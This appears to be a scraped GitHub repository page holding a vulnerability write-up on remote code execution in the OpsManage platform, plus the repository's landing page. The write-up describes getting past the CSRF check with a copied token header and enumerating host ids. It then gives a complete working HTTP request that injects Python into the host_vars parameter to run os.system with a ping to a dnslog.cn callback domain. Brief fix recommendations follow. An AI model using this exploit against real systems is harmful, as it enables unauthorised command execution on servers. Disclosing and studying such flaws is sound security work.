[![image](https://private-user-images.githubusercontent.com/65012958/387507371-0acf6bd4-a3ce-4ce5-bfec-2b8c0e50939b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDczNzEtMGFjZjZiZDQtYTNjZS00Y2U1LWJmZWMtMmI4YzBlNTA5MzliLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQxNDYzNGFkY2YzYjE3NzU5OWZjNDFmMDI1OWQ4NGViN2UyNWE5NDA4OWNmMDk2N2I3NGIzOThiOGRiYjY0Y2EmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3dZ-p8ogdjIvP4VYuSBxYhWQ15OgUzEj2XLpzRmhEuY)](https://private-user-images.githubusercontent.com/65012958/387507371-0acf6bd4-a3ce-4ce5-bfec-2b8c0e50939b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDczNzEtMGFjZjZiZDQtYTNjZS00Y2U1LWJmZWMtMmI4YzBlNTA5MzliLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQxNDYzNGFkY2YzYjE3NzU5OWZjNDFmMDI1OWQ4NGViN2UyNWE5NDA4OWNmMDk2N2I3NGIzOThiOGRiYjY0Y2EmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3dZ-p8ogdjIvP4VYuSBxYhWQ15OgUzEj2XLpzRmhEuY)

Then, obtain the **sessionid** from any other requests and record them all.

Since `/api/host/vars/123/` is a Django REST API endpoint, and OpsManage has CSRF filtering enabled by default, if you try to access it directly with the **csrftoken** from `/login/`, you will see the message **'CSRF token missing or incorrect.'**

[![image](https://private-user-images.githubusercontent.com/65012958/387513830-261670ec-4c8c-42f9-84de-8128d785e50b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTM4MzAtMjYxNjcwZWMtNGM4Yy00MmY5LTg0ZGUtODEyOGQ3ODVlNTBiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkyYjdlYWVmODk3NjEwZGY4Y2FhMTBlYzg3MTgwNjM5YjY5ZjQ3OTNhNTFmZTkxZTYwOTcyODdmZjMzZjJmMjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.iA095h88WYQM6fTrSiWzVdDynYZV1DikTEMevD3g6-w)](https://private-user-images.githubusercontent.com/65012958/387513830-261670ec-4c8c-42f9-84de-8128d785e50b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTM4MzAtMjYxNjcwZWMtNGM4Yy00MmY5LTg0ZGUtODEyOGQ3ODVlNTBiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkyYjdlYWVmODk3NjEwZGY4Y2FhMTBlYzg3MTgwNjM5YjY5ZjQ3OTNhNTFmZTkxZTYwOTcyODdmZjMzZjJmMjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.iA095h88WYQM6fTrSiWzVdDynYZV1DikTEMevD3g6-w)

I bypassed the middleware check by setting the **X-CSRFTOKEN** request header. Specifically, I set the value of **X-CSRFTOKEN** to match the **csrftoken** from the cookie.

[![image](https://private-user-images.githubusercontent.com/65012958/387513612-d09b3158-64e8-4e65-9682-70490797756d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTM2MTItZDA5YjMxNTgtNjRlOC00ZTY1LTk2ODItNzA0OTA3OTc3NTZkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzYjQ2MTIxMjgxNjE4NGFkMjAyNzA3NWFjZDQ5MmVjOGYwZDc5ZDlmY2ZlNjYwM2VmN2MzMjQ4MTZjMjkxZjgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8LAt9cHOVe-NDHcT2ji_4fTyCWdzctDZUdStynIcUYU)](https://private-user-images.githubusercontent.com/65012958/387513612-d09b3158-64e8-4e65-9682-70490797756d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTM2MTItZDA5YjMxNTgtNjRlOC00ZTY1LTk2ODItNzA0OTA3OTc3NTZkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzYjQ2MTIxMjgxNjE4NGFkMjAyNzA3NWFjZDQ5MmVjOGYwZDc5ZDlmY2ZlNjYwM2VmN2MzMjQ4MTZjMjkxZjgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8LAt9cHOVe-NDHcT2ji_4fTyCWdzctDZUdStynIcUYU)

It returned a 404 page, which means we have at least entered the endpoint's execution logic.

To obtain a valid **`id`**, I used an enumeration method to check which **`id`** would return a different response.

[![image](https://private-user-images.githubusercontent.com/65012958/387515880-56710a11-2c0f-41fb-94fa-452f3867671d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTU4ODAtNTY3MTBhMTEtMmMwZi00MWZiLTk0ZmEtNDUyZjM4Njc2NzFkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM4MWVhMDM5NjRmNzkwZTVkZDkzNzk1MmMwOGNmMGQ1YzYwMTgwY2IwMGEyOWYwMTQyNzgzM2RjMGNjNDdlOWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NJVFbVj02EYuD60nX_p16hXbQ2K-vFTWNPwEtqkJiDU)](https://private-user-images.githubusercontent.com/65012958/387515880-56710a11-2c0f-41fb-94fa-452f3867671d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTU4ODAtNTY3MTBhMTEtMmMwZi00MWZiLTk0ZmEtNDUyZjM4Njc2NzFkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM4MWVhMDM5NjRmNzkwZTVkZDkzNzk1MmMwOGNmMGQ1YzYwMTgwY2IwMGEyOWYwMTQyNzgzM2RjMGNjNDdlOWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NJVFbVj02EYuD60nX_p16hXbQ2K-vFTWNPwEtqkJiDU)

Clearly, those are the ones.

I used the `ping` command to verify the effect of command execution. After changing the **`id`** to **10** and adding the **`host_vars`** parameter with Python code, I sent the request.

[![image](https://private-user-images.githubusercontent.com/65012958/387517866-6582dcc8-2a14-45d6-a741-96e4ff462a04.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTc4NjYtNjU4MmRjYzgtMmExNC00NWQ2LWE3NDEtOTZlNGZmNDYyYTA0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc4NzlhYjRmMjViNTI4MjE2ZDhiMDU2NDQ2MGQyYzA3M2U3YjAxZGY3ZmEzZmY3OGI4NGU4MTY0YjYyNGYzMjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.uJWk9mOdXhDiXhNlcTN7vSPlF4XsToa2ufUxB8JMfrY)](https://private-user-images.githubusercontent.com/65012958/387517866-6582dcc8-2a14-45d6-a741-96e4ff462a04.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MTc4NjYtNjU4MmRjYzgtMmExNC00NWQ2LWE3NDEtOTZlNGZmNDYyYTA0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc4NzlhYjRmMjViNTI4MjE2ZDhiMDU2NDQ2MGQyYzA3M2U3YjAxZGY3ZmEzZmY3OGI4NGU4MTY0YjYyNGYzMjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.uJWk9mOdXhDiXhNlcTN7vSPlF4XsToa2ufUxB8JMfrY)

In the DNS log, I can see that the domain was requested, which indicates that the code execution was successful.

# Payload

```
POST http://42.194.214.22:8000/api/host/vars/10/ HTTP/1.1
Host: 42.194.214.22:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: http://42.194.214.22:8000
DNT: 1
Connection: close
Referer: http://42.194.214.22:8000/login/
Cookie: csrftoken=KGkFpRkuCXci60JBgUI5nGxXcDIkifhrZBVP760X4zJtYi5H70kynu6bbiqzb036; sessionid=xodr9tlwkgteuqebiqg5gjrsmj7p02t1
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-CSRFTOKEN: KGkFpRkuCXci60JBgUI5nGxXcDIkifhrZBVP760X4zJtYi5H70kynu6bbiqzb036

host_vars=__import__('os').system('ping%20-c%201%201b4zxr.dnslog.cn')

```

## Fix Recommendations

1. Add permissions for endpoint **deploy\_host\_vars**
2. Filter the value of **`host_vars`** to prevent unexpected code execution.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7e8e5192_20250114_203646.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSp1d3rL1%2FOpsManage_RCE)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSp1d3rL1%2FOpsManage_RCE)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Sp1d3rL1%2FOpsManage_RCE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Sp1d3rL1](/Sp1d3rL1)
/
**[OpsManage\_RCE](/Sp1d3rL1/OpsManage_RCE)**
Public

* [Notifications](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE)
* [Star
   0](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE)

T3BzTWFuYWdlIFJDRQ==

[0
stars](/Sp1d3rL1/OpsManage_RCE/stargazers) [0
forks](/Sp1d3rL1/OpsManage_RCE/forks) [Branches](/Sp1d3rL1/OpsManage_RCE/branches) [Tags](/Sp1d3rL1/OpsManage_RCE/tags) [Activity](/Sp1d3rL1/OpsManage_RCE/activity)
 [Star](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE)

 [Notifications](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE) You must be signed in to change notification settings

* [Code](/Sp1d3rL1/OpsManage_RCE)
* [Issues
  0](/Sp1d3rL1/OpsManage_RCE/issues)
* [Pull requests
  0](/Sp1d3rL1/OpsManage_RCE/pulls)
* [Actions](/Sp1d3rL1/OpsManage_RCE/actions)
* [Projects
  0](/Sp1d3rL1/OpsManage_RCE/projects)
* [Security](/Sp1d3rL1/OpsManage_RCE/security)
* [Insights](/Sp1d3rL1/OpsManage_RCE/pulse)

Additional navigation options

* [Code](/Sp1d3rL1/OpsManage_RCE)
* [Issues](/Sp1d3rL1/OpsManage_RCE/issues)
* [Pull requests](/Sp1d3rL1/OpsManage_RCE/pulls)
* [Actions](/Sp1d3rL1/OpsManage_RCE/actions)
* [Projects](/Sp1d3rL1/OpsManage_RCE/projects)
* [Security](/Sp1d3rL1/OpsManage_RCE/security)
* [Insights](/Sp1d3rL1/OpsManage_RCE/pulse)

# Sp1d3rL1/OpsManage\_RCE

    main[Branches](/Sp1d3rL1/OpsManage_RCE/branches)[Tags](/Sp1d3rL1/OpsManage_RCE/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[7 Commits](/Sp1d3rL1/OpsManage_RCE/commits/main/) | | |
| [OpsManage RCE.md](/Sp1d3rL1/OpsManage_RCE/blob/main/OpsManage%20RCE.md "OpsManage RCE.md") | | [OpsManage RCE.md](/Sp1d3rL1/OpsManage_RCE/blob/main/OpsManage%20RCE.md "OpsManage RCE.md") |  |  |
| [README.md](/Sp1d3rL1/OpsManage_RCE/blob/main/README.md "README.md") | | [README.md](/Sp1d3rL1/OpsManage_RCE/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Opsmanage RCE

## About

T3BzTWFuYWdlIFJDRQ==

### Resources

[Readme](#readme-ov-file)

[Activity](/Sp1d3rL1/OpsManage_RCE/activity)
### Stars

[**0**
stars](/Sp1d3rL1/OpsManage_RCE/stargazers)
### Watchers

[**1**
watching](/Sp1d3rL1/OpsManage_RCE/watchers)
### Forks

[**0**
forks](/Sp1d3rL1/OpsManage_RCE/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FSp1d3rL1%2FOpsManage_RCE&report=Sp1d3rL1+%28user%29)

## [Releases](/Sp1d3rL1/OpsManage_RCE/releases)

No releases published

## [Packages 0](/users/Sp1d3rL1/packages?repo_name=OpsManage_RCE)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


